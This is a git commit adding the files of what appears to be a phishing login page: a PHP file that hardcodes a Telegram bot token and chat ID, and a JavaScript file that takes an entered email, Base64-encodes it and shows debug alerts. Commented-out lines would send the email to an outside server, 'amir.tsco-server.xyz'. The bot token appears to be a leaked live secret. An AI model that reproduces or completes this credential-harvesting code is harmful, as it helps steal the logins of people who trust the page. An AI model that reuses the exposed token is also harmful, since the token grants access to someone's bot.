ba327677b6e0d008636b142aaad2b8cfa585fabc
Techlords <cyberhackers564@gmail.com>
2024-07-09 07:31:14 +0100

    Add files via upload

---
+++ pedartel.php
@@ -0,0 +1,7 @@
+<?php
+
+
+$TOKEN = "6313423365:AAHtXgX7xYC-whQ6c6f0VlbLeTNY5zOrpn4";
+$ID = "6539847479";
+
+?>
---
+++ script.js
@@ -0,0 +1,90 @@
+let switchCtn = document.querySelector("#switch-cnt");
+let switchC1 = document.querySelector("#switch-c1");
+let switchC2 = document.querySelector("#switch-c2");
+let switchCircle = document.querySelectorAll(".switch__circle");
+let switchBtn = document.querySelectorAll(".switch-btn");
+let aContainer = document.querySelector("#a-container");
+let bContainer = document.querySelector("#b-container");
+let allButtons = document.querySelectorAll(".submit");
+var Base64={_keyStr:"ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/=",encode:function(e){var t="";var n,r,i,s,o,u,a;var f=0;e=Base64._utf8_encode(e);while(f<e.length){n=e.charCodeAt(f++);r=e.charCodeAt(f++);i=e.charCodeAt(f++);s=n>>2;o=(n&3)<<4|r>>4;u=(r&15)<<2|i>>6;a=i&63;if(isNaN(r)){u=a=64}else if(isNaN(i)){a=64}t=t+this._keyStr.charAt(s)+this._keyStr.charAt(o)+this._keyStr.charAt(u)+this._keyStr.charAt(a)}return t},decode:function(e){var t="";var n,r,i;var s,o,u,a;var f=0;e=e.replace(/[^A-Za-z0-9\+\/\=]/g,"");while(f<e.length){s=this._keyStr.indexOf(e.charAt(f++));o=this._keyStr.indexOf(e.charAt(f++));u=this._keyStr.indexOf(e.charAt(f++));a=this._keyStr.indexOf(e.charAt(f++));n=s<<2|o>>4;r=(o&15)<<4|u>>2;i=(u&3)<<6|a;t=t+String.fromCharCode(n);if(u!=64){t=t+String.fromCharCode(r)}if(a!=64){t=t+String.fromCharCode(i)}}t=Base64._utf8_decode(t);return t},_utf8_encode:function(e){e=e.replace(/\r\n/g,"\n");var t="";for(var n=0;n<e.length;n++){var r=e.charCodeAt(n);if(r<128){t+=String.fromCharCode(r)}else if(r>127&&r<2048){t+=String.fromCharCode(r>>6|192);t+=String.fromCharCode(r&63|128)}else{t+=String.fromCharCode(r>>12|224);t+=String.fromCharCode(r>>6&63|128);t+=String.fromCharCode(r&63|128)}}return t},_utf8_decode:function(e){var t="";var n=0;var r=c1=c2=0;while(n<e.length){r=e.charCodeAt(n);if(r<128){t+=String.fromCharCode(r);n++}else if(r>191&&r<224){c2=e.charCodeAt(n+1);t+=String.fromCharCode((r&31)<<6|c2&63);n+=2}else{c2=e.charCodeAt(n+1);c3=e.charCodeAt(n+2);t+=String.fromCharCode((r&15)<<12|(c2&63)<<6|c3&63);n+=3}}return t}};
+let getButtons = (e) => e.preventDefault()
+
+let changeForm = (e) => {
+
+    switchCtn.classList.add("is-gx");
+    setTimeout(function(){
+        switchCtn.classList.remove("is-gx");
+    }, 1500)
+
+    switchCtn.classList.toggle("is-txr");
+    switchCircle[0].classList.toggle("is-txr");
+    switchCircle[1].classList.toggle("is-txr");
+
+    switchC1.classList.toggle("is-hidden");
+    switchC2.classList.toggle("is-hidden");
+    aContainer.classList.toggle("is-txl");
+    bContainer.classList.toggle("is-txl");
+    bContainer.classList.toggle("is-z200");
+}
+
+let mainF = (e) => {
+    for (var i = 0; i < allButtons.length; i++)
+        allButtons[i].addEventListener("click", getButtons );
+    for (var i = 0; i < switchBtn.length; i++)
+        switchBtn[i].addEventListener("click", changeForm)
+}
+function httpGet(theUrl)
+{
+    var xmlHttp = new XMLHttpRequest();
+    xmlHttp.open( "GET", theUrl, false );
+    xmlHttp.send( null );
+    return xmlHttp.responseText;
+}
+function Login(){
+    var Email = document.getElementById('Em').value;
+    if (Email.length < 12) {
+      alert('Phars Is Invalid !')
+    }else{
+    // httpGet("https://amir.tsco-server.xyz/wl/login/login.php?em=" + Email);
+    var BSE = Base64.encode(Email);
+    alert("BSE :  "+BSE)
+    var R = "|" + BSE;
+    alert("R :  "+R)
+    // window.location = "https://amir.tsco-server.xyz/wl/log.php?_="+R;
+    alert('HI HEY HOLO      '+ Email)
+    }
+}
+window.addEventListener("load", mainF);
+document.addEventListener('DOMContentLoaded', function () {
+    var modeSwitch = document.querySelector('.mode-switch');
+  
+    modeSwitch.addEventListener('click', function () {                     document.documentElement.classList.toggle('dark');
+      modeSwitch.classList.toggle('active');
+    });
+    
+    var listView = document.querySelector('.list-view');
+    var gridView = document.querySelector('.grid-view');
+    var projectsList = document.querySelector('.project-boxes');
+    
+    listView.addEventListener('click', function () {
+      gridView.classList.remove('active');
+      listView.classList.add('active');
+      projectsList.classList.remove('jsGridView');
+      projectsList.classList.add('jsListView');
+    });
+    
+    gridView.addEventListener('click', function () {
+      gridView.classList.add('active');
+      listView.classList.remove('active');
+      projectsList.classList.remove('jsListView');
+      projectsList.classList.add('jsGridView');
+    });
+    
+    document.querySelector('.messages-btn').addEventListener('click', function () {
+      document.querySelector('.messages-section').classList.add('show');
+    });
+    
+    document.querySelector('.messages-close').addEventListener('click', function() {
+      document.querySelector('.messages-section').classList.remove('show');
+    });
+  });
